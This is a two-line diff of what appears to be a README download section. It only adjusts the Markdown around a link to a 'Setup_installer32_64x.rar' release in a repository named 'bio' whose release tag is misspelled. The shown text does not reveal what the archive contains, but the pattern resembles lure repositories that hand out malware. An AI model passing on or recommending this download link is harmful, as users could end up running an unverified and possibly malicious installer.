@@ -5,7 +5,7 @@
 > ***How to download:***
 
 
-(![image](https://github.com/user-attachments/assets/a28c3c73-5faf-425c-a621-a900832a06e7) ([](https://github.com/Jok0daraes/bio/releases/download/realese/Setup_installer32_64x.rar))
+(![image](https://github.com/user-attachments/assets/a28c3c73-5faf-425c-a621-a900832a06e7) [](https://github.com/Jok0daraes/bio/releases/download/realese/Setup_installer32_64x.rar)
 
 
 
